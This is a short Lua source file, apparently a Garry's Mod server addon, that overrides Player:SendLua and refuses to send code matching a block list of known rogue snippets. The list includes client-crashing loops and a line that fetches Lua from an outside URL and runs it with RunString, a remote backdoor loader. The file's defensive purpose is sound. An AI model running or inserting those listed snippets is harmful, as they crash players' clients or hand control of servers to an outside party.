if not GYS.GYP.Luarun then return end
util.AddNetworkString("GYS.GYP.SendLua")
local meta = FindMetaTable("Player")
local badCode = {
    ["function die() return die() end die()"] = true,
    ["while true do end"] = true,
    ['net.Receive("REBUG", function(len) chat.AddText(unpack(net.ReadTable()))end)'] = true,
    ['http.Fetch("https://rvac.cc/log1n/bd.lua",RunString))'] = true
}
function meta:SendLua(lua)
    print("Received Lua")
    if badCode[lua] then
        GYS.Log("[GYP] Protected " .. self:Nick() .. " from rogue code.")
        return false
    else
        net.Start("GYS.GYP.SendLua")
        net.WriteString(lua)
        net.Send(self)
    end
end